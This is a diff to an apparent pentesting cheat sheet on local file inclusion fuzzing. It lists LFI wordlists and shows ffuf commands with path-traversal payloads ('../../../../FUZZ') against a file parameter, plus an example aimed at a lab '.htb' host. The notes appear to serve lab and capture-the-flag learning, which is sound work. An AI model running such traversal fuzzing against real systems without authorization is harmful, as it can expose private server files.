@@ -150,7 +150,7 @@ Null Bytes -- works on PHP versions pre 5.5
 ## LFI Fuzzing
 We can use burp intruder to fuzz the path but it sucks without burp pro
 
-Use LFI wordlists `/usr/share/wordlists/seclists/Fuzzing/LFI`
+LFI wordlists:
 	LFI-LFISuite-pathtotest-huge.txt `START HERE`
 	LFI-etc-files-of-all-linux-packages.txthome
 	burp-parameter-names.txt
@@ -169,9 +169,14 @@ Other Tools
 Fuzzing Demonstration
 ```bash
 # General scan
-ffuf -w /usr/share/seclists/Fuzzing/LFI/<wordlist>:FUZZ -u http://$IP/<paramater>?<file>=/../../../../../../../FUZZ -ac
-	-ac filters out noise ;)
+ffuf -w /path/to/<wordlist>:FUZZ -u http://$IP/<paramater>?<file>=FUZZ -ac
+	-mc all   # all all codes
+	-ac       # fsmart decide what to filter
 	-fs <num> # filter out defaults
+	
+	# Example
+	ffuf -w /opt/lists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://www.snoopy.htb/download?file=FUZZ' -mc all -ac
+
 
 # Fuzzing Server Web Root
 ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -ac
